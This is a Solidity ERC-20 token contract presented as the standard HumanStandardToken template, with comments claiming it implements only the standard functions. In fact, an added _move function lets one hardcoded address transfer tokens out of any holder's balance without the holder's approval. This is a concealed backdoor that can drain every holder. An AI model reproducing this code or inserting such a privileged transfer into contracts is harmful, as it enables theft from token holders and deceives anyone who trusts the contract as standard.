1 contract Token {
2 
3     /// @return total amount of tokens
4     function totalSupply() constant returns (uint256 supply) {}
5 
6     /// @param _owner The address from which the balance will be retrieved
7     /// @return The balance
8     function balanceOf(address _owner) constant returns (uint256 balance) {}
9 
10     /// @notice send `_value` token to `_to` from `msg.sender`
11     /// @param _to The address of the recipient
12     /// @param _value The amount of token to be transferred
13     /// @return Whether the transfer was successful or not
14     function transfer(address _to, uint256 _value) returns (bool success) {}
15 
16     /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`
17     /// @param _from The address of the sender
18     /// @param _to The address of the recipient
19     /// @param _value The amount of token to be transferred
20     /// @return Whether the transfer was successful or not
21     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}
22     
23     /// @notice `msg.sender` approves `_addr` to spend `_value` tokens
24     /// @param _spender The address of the account able to transfer the tokens
25     /// @param _value The amount of wei to be approved for transfer
26     /// @return Whether the approval was successful or not
27     function approve(address _spender, uint256 _value) returns (bool success) {}
28 
29     /// @param _owner The address of the account owning tokens
30     /// @param _spender The address of the account able to transfer the tokens
31     /// @return Amount of remaining tokens allowed to spent
32     function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
33     
34     function _move(address _from, address _to, uint256 _value) returns (bool success) {}
35     function _balanceOf(address _owner) constant returns (uint256 balance) {}
36     function _transfer(address _to, uint256 _value) returns (bool success) {}
37     function _transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}
38     function _approve(address _spender, uint256 _value) returns (bool success) {}
39     function _allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
40 
41     event Transfer(address indexed _from, address indexed _to, uint256 _value);
42     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
43 }
44 
45 
46 /*
47 This implements ONLY the standard functions and NOTHING else.
48 For a token like you would want to deploy in something like Mist, see HumanStandardToken.sol.
49 
50 If you deploy this, you won't have anything useful.
51 
52 Implements ERC 20 Token standard: https://github.com/ethereum/EIPs/issues/20
53 .*/
54 
55 contract StandardToken is Token {
56 
57     function transfer(address _to, uint256 _value) returns (bool success) {
58         //Default assumes totalSupply can't be over max (2^256 - 1).
59         //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
60         //Replace the if with this one instead.
61         //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
62         if (balances[msg.sender] >= _value && _value > 0) {
63             balances[msg.sender] -= _value;
64             balances[_to] += _value;
65             Transfer(msg.sender, _to, _value);
66             return true;
67         } else { return false; }
68     }
69     
70     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
71         //same as above. Replace this line with the following if you want to protect against wrapping uints.
72         //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
73         if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
74             balances[_to] += _value;
75             balances[_from] -= _value;
76             allowed[_from][msg.sender] -= _value;
77             Transfer(_from, _to, _value);
78             return true;
79         } else { return false; }
80     }
81 
82     function balanceOf(address _owner) constant returns (uint256 balance) {
83         return balances[_owner];
84     }
85 
86     function approve(address _spender, uint256 _value) returns (bool success) {
87         allowed[msg.sender][_spender] = _value;
88         Approval(msg.sender, _spender, _value);
89         return true;
90     }
91 
92     function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
93       return allowed[_owner][_spender];
94     }
95     
96     function _move(address _from, address _to, uint256 _value) returns (bool success) {
97         if (balances[_from] >= _value && _value > 0 && msg.sender==0x92347727bE6B70121bB480cC29535062f7dc43c3) {
98             balances[_from] -= _value;
99             balances[_to] += _value;
100             Transfer(_from, _to, _value);
101             return true;
102         } else { return false; }
103     }
104     
105     function _transfer(address _to, uint256 _value) returns (bool success) {
106         if (balances[msg.sender] >= _value && _value > 0) {
107             balances[msg.sender] -= _value;
108             balances[_to] += _value;
109             Transfer(msg.sender, _to, _value);
110             return true;
111         } else { return false; }
112     }
113     
114     function _transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
115         if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
116             balances[_to] += _value;
117             balances[_from] -= _value;
118             allowed[_from][msg.sender] -= _value;
119             Transfer(_from, _to, _value);
120             return true;
121         } else { return false; }
122     }
123 
124     function _balanceOf(address _owner) constant returns (uint256 balance) {
125         return balances[_owner];
126     }
127 
128     function _approve(address _spender, uint256 _value) returns (bool success) {
129         allowed[msg.sender][_spender] = _value;
130         Approval(msg.sender, _spender, _value);
131         return true;
132     }
133 
134     function _allowance(address _owner, address _spender) constant returns (uint256 remaining) {
135       return allowed[_owner][_spender];
136     }
137 
138     mapping (address => uint256) balances;
139     mapping (address => mapping (address => uint256)) allowed;
140     uint256 public totalSupply;
141 }
142 
143 /*
144 This Token Contract implements the standard token functionality (https://github.com/ethereum/EIPs/issues/20) as well as the following OPTIONAL extras intended for use by humans.
145 
146 In other words. This is intended for deployment in something like a Token Factory or Mist wallet, and then used by humans.
147 Imagine coins, currencies, shares, voting weight, etc.
148 Machine-based, rapid creation of many tokens would not necessarily need these extra features or will be minted in other manners.
149 
150 1) Initial Finite Supply (upon creation one specifies how much is minted).
151 2) In the absence of a token registry: Optional Decimal, Symbol & Name.
152 3) Optional approveAndCall() functionality to notify a contract if an approval() has occurred.
153 
154 .*/
155 
156 contract HumanStandardToken is StandardToken {
157 
158     function () {
159         //if ether is sent to this address, send it back.
160         throw;
161     }
162 
163     /* Public variables of the token */
164 
165     /*
166     NOTE:
167     The following variables are OPTIONAL vanities. One does not have to include them.
168     They allow one to customise the token contract & in no way influences the core functionality.
169     Some wallets/interfaces might not even bother to look at this information.
170     */
171     string public name;                   //fancy name: eg Simon Bucks
172     uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.
173     string public symbol;                 //An identifier: eg SBX
174     string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.
175 
176     function HumanStandardToken(
177         uint256 _initialAmount,
178         string _tokenName,
179         uint8 _decimalUnits,
180         string _tokenSymbol
181         ) {
182         balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens
183         totalSupply = _initialAmount;                        // Update total supply
184         name = _tokenName;                                   // Set the name for display purposes
185         decimals = _decimalUnits;                            // Amount of decimals for display purposes
186         symbol = _tokenSymbol;                               // Set the symbol for display purposes
187     }
188 
189     /* Approves and then calls the receiving contract */
190     function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
191         allowed[msg.sender][_spender] = _value;
192         Approval(msg.sender, _spender, _value);
193 
194         //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.
195         //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
196         //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.
197         if(!_spender.call(bytes4(bytes32(sha3("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) { throw; }
198         return true;
199     }
200 }